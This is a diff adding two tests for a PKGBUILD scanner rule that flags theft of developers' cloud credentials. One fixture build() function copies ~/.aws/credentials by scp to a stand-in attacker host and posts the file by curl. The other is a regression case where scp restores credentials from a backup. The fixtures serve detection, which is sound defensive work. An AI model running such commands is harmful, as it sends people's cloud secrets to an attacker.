@@ -111,6 +111,34 @@ def test_exf005_fires_on_kubeconfig_read_plus_upload(make_pkgbuild_ctx):
     assert len(list(EXF005DeveloperCloudCredentialExfiltration().check(ctx))) == 1
 
 
+def test_exf005_fires_on_scp_exfiltrating_aws_credentials(make_pkgbuild_ctx):
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          scp ~/.aws/credentials attacker@evil.example:/tmp/loot
+          curl -s -d @/tmp/loot https://evil.example/notify
+        }
+        """
+    )
+    assert len(list(EXF005DeveloperCloudCredentialExfiltration().check(ctx))) == 1
+
+
+def test_exf005_does_not_fire_when_scp_writes_to_credential_path(make_pkgbuild_ctx):
+    # Regression: scp/rsync are directional (`cmd [opts] source... dest`, dest
+    # always last) -- restoring a credentials file FROM a remote backup has
+    # the credential path as the destination, not something being read and
+    # exfiltrated, and must not fire even alongside an unrelated network call.
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          scp backup.zip user@legit.example:~/.aws/credentials
+          curl -s -d @/tmp/unrelated https://legit.example/notify
+        }
+        """
+    )
+    assert list(EXF005DeveloperCloudCredentialExfiltration().check(ctx)) == []
+
+
 def test_exf005_does_not_fire_on_read_without_upload(make_pkgbuild_ctx):
     ctx = make_pkgbuild_ctx(
         """
